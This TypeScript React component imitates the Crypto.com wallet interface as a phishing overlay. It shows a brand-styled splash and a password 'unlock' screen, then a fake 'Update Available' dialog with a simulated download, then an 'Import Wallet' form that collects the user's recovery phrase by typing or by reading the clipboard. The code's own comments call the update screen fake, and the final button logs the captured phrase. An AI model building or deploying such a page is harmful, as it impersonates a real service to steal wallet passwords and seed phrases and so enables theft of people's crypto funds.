import { useState, useEffect } from 'react';

interface CryptoComPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function CryptoComPanel({ isOpen, onClose }: CryptoComPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phraseLength, setPhraseLength] = useState<12 | 18 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [showPhrase, setShowPhrase] = useState(false);
  const [updateProgress, setUpdateProgress] = useState(0);
  const [seedError, setSeedError] = useState(false);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setShowPhrase(false);
      setUpdateProgress(0);
      setSeedError(false);

      const timer = setTimeout(() => setView('password'), 3000); // slightly longer to enjoy the splash
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake updating screen
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 15) + 5;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600);
        }
        setUpdateProgress(progress);
      }, 300);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    const hasError = newValues.slice(0, phraseLength).some(val => val.length > 0 && !/^[a-z]+$/.test(val));
    setSeedError(hasError);
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const words = text.toLowerCase().trim().split(/\s+/);
      const newValues = [...phraseValues];
      
      words.forEach((word, i) => {
        if (i < phraseLength) newValues[i] = word;
      });
      
      setPhraseValues(newValues);
      
      const hasError = newValues.slice(0, phraseLength).some(val => val.length > 0 && !/^[a-z]+$/.test(val));
      setSeedError(hasError);
    } catch (err) {
      console.error('Failed to read clipboard: ', err);
    }
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && !seedError;
  };

  return (
    <>
      <div className={`fixed inset-0 z-[2147483648] font-sans ${isOpen ? 'pointer-events-auto' : 'pointer-events-none'}`}>
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out ${isOpen ? 'opacity-100' : 'opacity-0'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border border-[#292929] md:rounded-xl overflow-hidden ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#ffffff] dark:bg-[#121212] shadow-2xl relative overflow-hidden flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] bg-[#F4F7FB] dark:bg-[#121212] ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <CryptoBgSVG className="absolute inset-0 w-full h-full object-cover animate-[cryptoPulse_4s_ease-in-out_infinite]" />
              
              {/* FLOATING CRYPTO TOKENS CONTAINER */}
              <div className="absolute inset-0 w-full h-full overflow-hidden pointer-events-none">
                
                {/* 1. Cronos (CRO) */}
                {/* CHANGE 'top-[35%]' and 'left-[15%]' below to move this token */}
                <div className="absolute top-[35%] left-[15%] w-[45px] h-[45px] bg-[#002D74] rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_6s_ease-in-out_infinite]">
                  <CronosTokenSVG className="w-7 h-7 text-white" />
                </div>
                
                {/* 2. Bitcoin (BTC) */}
                {/* CHANGE 'top-[20%]' and 'right-[20%]' below to move this token */}
                <div className="absolute top-[20%] right-[20%] w-[55px] h-[55px] bg-white rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_7s_ease-in-out_infinite_1s]">
                  <BitcoinTokenSVG className="w-[32px] h-[32px]" />
                </div>

                {/* 3. Ethereum (ETH) */}
                {/* CHANGE 'bottom-[25%]' and 'left-[25%]' below to move this token */}
                <div className="absolute bottom-[25%] left-[25%] w-[50px] h-[50px] bg-white rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_5s_ease-in-out_infinite_2s]">
                  <EthereumTokenSVG className="w-7 h-7 text-[#627EEA]" />
                </div>

                {/* 4. Second Cronos (CRO) */}
                {/* CHANGE 'bottom-[35%]' and 'right-[15%]' below to move this token */}
                <div className="absolute bottom-[35%] right-[15%] w-[40px] h-[40px] bg-white rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_8s_ease-in-out_infinite_0.5s]">
                  <CronosTokenSVG className="w-6 h-6 text-[#002D74]" />
                </div>

              </div>

              {/* Main Center Logo */}
              <div className="relative z-10 flex flex-col items-center justify-center animate-[fadeIn_0.5s_ease-out]">
                <CryptoIconSVG className="w-24 h-24 mb-4 text-[#002D74] drop-shadow-xl" />
                <CryptoTextLogoSVG className="h-6 w-auto text-[#0B1426]" />
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col pt-24 px-6 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-[#ffffff] dark:bg-[#121212] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-center items-center mb-12 shrink-0">
                <h1 className="text-center text-[24px] font-semibold text-[#323c52] dark:text-[#ffffff] font-roboto">Welcome!</h1>
              </div>
              
              <div className="flex justify-center items-center mb-8 shrink-0">
                <p className="text-center text-[16px] font-medium text-[#5d667b] dark:text-[#b3b3b3] font-roboto">Enter your password to unlock your wallet</p>
              </div>
              
              <div className="flex flex-col w-full flex-1">
                <div className="flex items-center justify-start mb-2">
                  <p className="text-start text-[13px] font-medium text-[#808c99] dark:text-[#b3b3b3] font-roboto">Password</p>
                </div>
                <div className="relative w-full mb-8">
                  <input 
                    className="w-full h-[48px] border border-transparent outline-none rounded-[8px] py-[12px] px-[16px] text-[14px] text-[#000000e0] dark:text-[#ffffffe0] font-roboto font-medium bg-[#F2F4F6] dark:bg-[#2C3039] placeholder-[#B5B7B8] dark:placeholder-[#7E8493] transition-all duration-300 hover:border-[#1199fa] focus:border-[#1199fa] focus:shadow-[0_0_0_2px_rgba(17,153,250,0.2)] pr-10" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button 
                    type="button" 
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-3.5 text-[#B5B7B8] dark:text-[#7E8493] hover:text-[#1199fa] transition-colors cursor-pointer"
                  >
                    {!showPassword ? (
                      <svg className="w-[18px] h-[18px]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    ) : (
                      <svg className="w-[18px] h-[18px]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08c.421-.052.845-.08 1.27-.08 7 0 10 7 10 7a13.163 13.163 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"></path></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full mt-auto mb-6 shrink-0">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full h-[48px] font-roboto bg-[#1199fa] hover:bg-[#3bb4ff] active:bg-[#0476d4] text-[#ffffff] py-[11px] px-[15px] rounded-[8px] font-semibold text-[16px] disabled:opacity-30 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]"
                  >
                    Unlock
                  </button>
                </div>
                <div className="text-center pb-8 shrink-0">
                  <span className="font-roboto text-[13px] font-medium text-[#5d667b] dark:text-[#b3b3b3]">
                    Forgot password? <span className="text-[#1199fa] font-normal hover:opacity-80 transition-all duration-300 cursor-pointer hover:underline">Reset your wallet</span>
                  </span>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col px-6 py-8 transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] bg-[#ffffff] dark:bg-[#121212] ${view === 'update_prompt' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="flex flex-col items-center justify-center mb-2 mt-4">
                <div className="mb-6 w-20 h-20 flex items-center justify-center">
                  <CryptoIconSVG className="w-full h-full text-[#1199fa]" />
                </div>
                <h3 className="font-roboto text-[#103F68] dark:text-[#ffffff] font-medium text-[24px] leading-[28px] mb-2 text-center">Update Available</h3>
                <p className="font-roboto text-[#6a7587] dark:text-[#b3b3b3] font-normal text-[16px] leading-[18px] mb-6 text-center">Version 3.5.2</p>
              </div>
              
              <div className="flex-grow mb-8 overflow-y-auto">
                <h4 className="font-roboto text-[#103F68] dark:text-[#ffffff] font-medium text-[18px] mb-4">What's new</h4>
                <ul className="space-y-4">
                  {[
                    "Enhanced security with advanced encryption protocols",
                    "Support for new tokens and chains including Solana and Avalanche",
                    "Improved transaction speed with optimized network connections",
                    "Real-time price alerts and portfolio tracking features",
                    "DApp browser with enhanced Web3 connectivity"
                  ].map((feature, i) => (
                    <li key={i} className="flex items-start">
                      <svg className="w-4 h-4 text-[#0D67FE] dark:text-[#1199fa] mr-3 flex-shrink-0 mt-0.5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
                      <span className="font-roboto text-[#103F68] dark:text-[#ffffff] font-normal text-[14px] leading-[18px]">{feature}</span>
                    </li>
                  ))}
                </ul>
              </div>
              
              <div className="mt-auto shrink-0">
                <button 
                  onClick={() => setView('updating')}
                  className="w-full text-[#ffffff] bg-[#1199fa] hover:bg-[#3bb4ff] active:bg-[#0476d4] font-semibold font-roboto text-[16px] cursor-pointer rounded-[8px] py-[13px] px-[15px] transition-all duration-300 active:scale-[0.98]" 
                  type="button"
                >
                  Update Now
                </button>
                <div className="text-center mt-5 pb-2">
                  <a href="https://help.crypto.com/en" target="_blank" rel="noreferrer" className="font-roboto text-[#1199fa] text-[14px] font-normal hover:underline">Need help? Visit our Support Center</a>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 bg-[#ffffff] dark:bg-[#121212] transition-opacity duration-500 ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="px-6 py-8 flex flex-col h-full items-center justify-center">
                <div className="flex flex-col items-center justify-center mb-10 w-full mt-10">
                  <div className="mb-10 relative">
                    <CryptoIconSVG className="w-20 h-20 text-[#1199fa] animate-[cryptoBounce_1.5s_ease-in-out_infinite]" />
                  </div>
                  <h3 className="font-roboto text-[#103F68] dark:text-[#ffffff] font-medium text-[24px] leading-[28px] mb-3 text-center">Updating Crypto.com Wallet</h3>
                  <p className="font-roboto text-[#6a7587] dark:text-[#b3b3b3] font-normal text-[16px] leading-[18px] mb-8 text-center">Please wait while we update to version 3.5.2</p>
                </div>
                
                <div className="w-full mb-6 mt-4">
                  <div className="w-full h-2 bg-[#f2f4f7] dark:bg-[#212121] rounded-full overflow-hidden">
                    <div className="h-full bg-[#1199fa] rounded-full transition-all duration-300" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  <div className="flex items-center justify-between mt-3">
                    <p className="font-roboto text-[#6a7587] dark:text-[#b3b3b3] text-[14px] font-normal">Downloading update...</p>
                    <p className="font-roboto text-[#103F68] dark:text-[#ffffff] text-[14px] font-bold">{updateProgress}%</p>
                  </div>
                </div>
                
                <div className="mt-auto text-center pb-4">
                  <p className="font-roboto text-[#6a7587] dark:text-[#919191] text-[14px] font-normal">Please do not close this window during the update.</p>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 bg-[#ffffff] dark:bg-[#121212] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex items-center p-4 shrink-0">
                <button className="p-2 -ml-2 rounded-full hover:bg-[#f3f3f3] dark:hover:bg-[#1a1a1a] transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#000000] dark:text-[#ffffff]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                </button>
              </div>

              {/* Step Indicators */}
              <div className="flex justify-center mb-4 gap-x-2 shrink-0">
                <div className="w-[62px] h-1.5 rounded-lg bg-[#1199fa]"></div>
                <div className="w-[62px] h-1.5 rounded-lg bg-[#eaeef4] dark:bg-[#333333]"></div>
              </div>

              <div className="px-6 mb-4 shrink-0">
                <h1 className="text-center text-[24px] font-bold text-[#0B1426] dark:text-[#ffffff] font-roboto">Import Wallet</h1>
                <p className="text-center text-[14.5px] font-medium text-[#5d667b] dark:text-[#b3b3b3] font-roboto mt-2">Import a crypto wallet by entering its recovery phrase</p>
              </div>

              {/* 12 / 18 / 24 Toggle */}
              <div className="flex justify-center mb-6 px-6 shrink-0">
                <div className="flex gap-x-2 p-1 w-full bg-[#f2f4f6] dark:bg-[#1a1a1a] rounded-full border border-transparent dark:border-[#2a2a2a]">
                  {[12, 18, 24].map((num) => (
                    <button 
                      key={num}
                      type="button" 
                      onClick={() => { setPhraseLength(num as 12|18|24); setPhraseValues(Array(24).fill('')); setSeedError(false); }}
                      className={`py-1.5 px-2 rounded-full text-[13px] font-medium font-roboto transition-all w-full ${phraseLength === num ? 'bg-[#1199fa] text-white shadow-md' : 'text-[#5d667b] dark:text-[#b3b3b3] hover:text-[#1199fa] dark:hover:text-white'}`}
                    >
                      {num} words
                    </button>
                  ))}
                </div>
              </div>

              {/* Grid */}
              <div className="px-6 grid gap-y-2 overflow-y-auto crypto-custom-scrollbar flex-1 pb-2">
                <div className={`grid gap-3 ${phraseLength === 12 ? 'grid-cols-2 sm:grid-cols-3' : 'grid-cols-3'}`}>
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const isError = phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]);
                    return (
                      <div key={i} className="relative group">
                        <input 
                          className={`w-full border outline-none rounded-[8px] py-[8px] pl-[10px] pr-[10px] text-[14px] text-[#000000e0] dark:text-[#ffffffe0] font-roboto transition-all duration-300 ${isError ? 'border-[#ff5252] bg-[#F2F4F6] dark:bg-[#2C3039] text-[#ff5252] dark:text-[#ff5252]' : 'border-transparent bg-[#F2F4F6] dark:bg-[#2C3039] hover:border-[#1199fa] focus:border-[#1199fa] focus:bg-white dark:focus:bg-[#1a1a1a] focus:shadow-[0_0_0_2px_rgba(17,153,250,0.2)]'}`} 
                          placeholder={`${i + 1}.`}
                          type={showPhrase ? "text" : "password"}
                          value={phraseValues[i]}
                          onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                        />
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Error Label */}
              <div className={`px-6 mt-1 mb-2 transition-opacity duration-300 min-h-[18px] shrink-0 ${seedError ? 'opacity-100' : 'opacity-0'}`}>
                <p className="text-[#e34935] text-[13px] text-start font-medium font-roboto">Recovery phrase is incorrect. Please try again.</p>
              </div>

              {/* Checkbox */}
              <div className="flex items-center px-6 mb-4 mt-1 shrink-0 cursor-pointer" onClick={() => setShowPhrase(!showPhrase)}>
                <div className={`w-4 h-4 rounded-[4px] border flex items-center justify-center mr-2.5 transition-colors ${showPhrase ? 'bg-[#1199fa] border-[#1199fa]' : 'border-[#808c99] dark:border-[#5d667b]'}`}>
                  {showPhrase && <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>}
                </div>
                <label className="text-[#0b1426] dark:text-[#ffffff] text-[13.5px] font-medium font-roboto cursor-pointer select-none">Show recovery phrase</label>
              </div>

              {/* Paste Hint */}
              <div className="flex justify-center items-center gap-x-2 mb-4 shrink-0">
                <button onClick={handlePaste} className="flex items-center justify-center gap-x-1.5 hover:opacity-80 transition-opacity p-1 group">
                  <svg className="w-[15px] h-[15px] text-[#1199fa]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>
                  <p className="text-[#565f76] dark:text-[#b3b3b3] group-hover:text-[#1199fa] text-[13px] font-medium font-roboto transition-colors">Paste from clipboard</p>
                </button>
              </div>

              {/* Proceed Button */}
              <div className="px-6 pb-6 mt-auto shrink-0 bg-white dark:bg-[#121212] pt-2">
                <button 
                  className="w-full font-roboto bg-[#1199fa] hover:bg-[#3bb4ff] active:bg-[#0476d4] text-[#ffffff] py-[13px] px-[15px] rounded-[12px] font-semibold text-[16px] disabled:opacity-30 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]" 
                  disabled={!isPhraseComplete()}
                  onClick={() => {
                    console.log("Crypto.com Import Complete:", phraseValues.slice(0, phraseLength));
                    onClose();
                  }}
                >
                  Proceed
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .crypto-custom-scrollbar::-webkit-scrollbar { width: 5px; }
        .crypto-custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .crypto-custom-scrollbar::-webkit-scrollbar-thumb { background: #d1d1d1; border-radius: 10px; }
        .crypto-custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #1199fa; }
        .dark .crypto-custom-scrollbar::-webkit-scrollbar-thumb { background: #3e3e3e; }
        .dark .crypto-custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #1199fa; }
        
        @keyframes cryptoPulse {
          0%, 100% { opacity: 0.8; transform: scale(1); }
          50% { opacity: 1; transform: scale(1.05); }
        }
        
        /* New Drift Animation for Floating Tokens */
        @keyframes cryptoDrift {
          0% { transform: translateY(20px) scale(0.9); opacity: 0; }
          20% { opacity: 0.7; }
          80% { opacity: 0.7; }
          100% { transform: translateY(-40px) scale(1.1); opacity: 0; }
        }

        @keyframes cryptoBounce {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-8px); }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// CRYPTO.COM SVG COMPONENTS
// -------------------------------------------------------------------

const CryptoBgSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 360 566" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path opacity="0.15" d="M205 565.5C363.782 565.5 492.5 436.782 492.5 278C492.5 119.218 363.782 -9.5 205 -9.5C46.2181 -9.5 -82.5 119.218 -82.5 278C-82.5 436.782 46.2181 565.5 205 565.5Z" stroke="#1199fa" strokeWidth="2"></path>
    <path opacity="0.25" d="M205 514.5C335.615 514.5 441.5 408.615 441.5 278C441.5 147.385 335.615 41.5 205 41.5C74.3847 41.5 -31.5 147.385 -31.5 278C-31.5 408.615 74.3847 514.5 205 514.5Z" stroke="#1199fa" strokeWidth="2"></path>
    <path opacity="0.4" d="M205 464.5C308.001 464.5 391.5 381.001 391.5 278C391.5 174.999 308.001 91.5 205 91.5C101.999 91.5 18.5 174.999 18.5 278C18.5 381.001 101.999 464.5 205 464.5Z" stroke="#1199fa" strokeWidth="2"></path>
  </svg>
);

const CryptoIconSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 59 67" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M34.0864 33.8836L36.5315 27.3984H21.707L24.2034 33.8836L23.4395 41.15H29.09L34.7918 41.1245L34.0864 33.8836Z" fill="currentColor"></path>
    <path d="M43.3081 29.5781L36.605 33.9161V41.6293L31.4844 46.516V48.8157L36.4259 53.339H40.5487L50.958 35.304L43.3118 29.5781H43.3081Z" fill="currentColor"></path>
    <path d="M40.4973 14.0469H17.6027L14.9492 25.6512H43.2568L40.4973 14.0469Z" fill="currentColor"></path>
    <path d="M21.6743 33.9121L14.8944 29.625L7.22266 35.2964L17.6795 53.3859H21.8644L26.8059 48.8118V46.512L21.6816 41.6254V33.9121H21.6743Z" fill="currentColor"></path>
    <path d="M29.0898 0L0 16.698V50.0977L29.0898 66.7994L58.1795 50.0977V16.698L29.0898 0ZM17.6059 14.0458H40.5005L43.26 25.6502H14.9524L17.6059 14.0458ZM26.8054 48.808L21.8639 53.3821H17.679L7.22219 35.2926L14.8939 29.6212L21.6739 33.9084V41.6216L26.7981 46.5118V48.8116L26.8054 48.808ZM23.4392 41.1493L24.2031 33.8829L21.7068 27.4013H36.5313L34.0861 33.8829L34.7915 41.1238L29.0898 41.1493H23.4392ZM40.548 53.3276H36.418L31.4801 48.8043V46.5045L36.6044 41.6143V33.9011L43.3039 29.5631L50.95 35.289L40.5407 53.324H40.548V53.3276Z" fill="#1199fa"></path>
  </svg>
);

const CryptoTextLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 249 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z" fill="currentColor"></path>
  </svg>
);

const BitcoinTokenSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
    <circle cx="16" cy="16" r="16" fill="#F7931A"/>
    <path d="M21.5 13.5C22.2 13 22.5 12.2 22.5 11.2C22.5 9 20.8 8.2 17.5 8.2H12V24H16V21H18C21.8 21 23.5 19.5 23.5 17C23.5 15.5 22.8 14.2 21.5 13.5ZM16 11H17.5C18.8 11 19.5 11.2 19.5 12.5C19.5 13.8 18.8 14 17.5 14H16V11ZM17.8 18.5H16V15.5H17.8C19.2 15.5 20.2 15.8 20.2 17C20.2 18.2 19.2 18.5 17.8 18.5Z" fill="#FFFFFF"/>
  </svg>
);

const EthereumTokenSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.925 23.969L15.812 24.036L7.387 19.066L15.925 32L24.469 19.066L15.925 23.969Z" fill="currentColor"/>
    <path d="M15.925 0L7.387 14.205L15.925 19.282L24.469 14.205L15.925 0Z" fill="currentColor" opacity="0.8"/>
  </svg>
);

const CronosTokenSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M19.117 19.467L20.573 15.228H12.019L13.488 19.467H19.117Z" fill="currentColor"/>
    <path d="M23.978 16.038L21.26 23.953H27.568L23.978 16.038Z" fill="currentColor"/>
    <path d="M8.627 16.038L5.024 23.953H11.344L8.627 16.038Z" fill="currentColor"/>
    <path d="M16.303 6L11.583 13.916H21.023L16.303 6Z" fill="currentColor"/>
  </svg>
);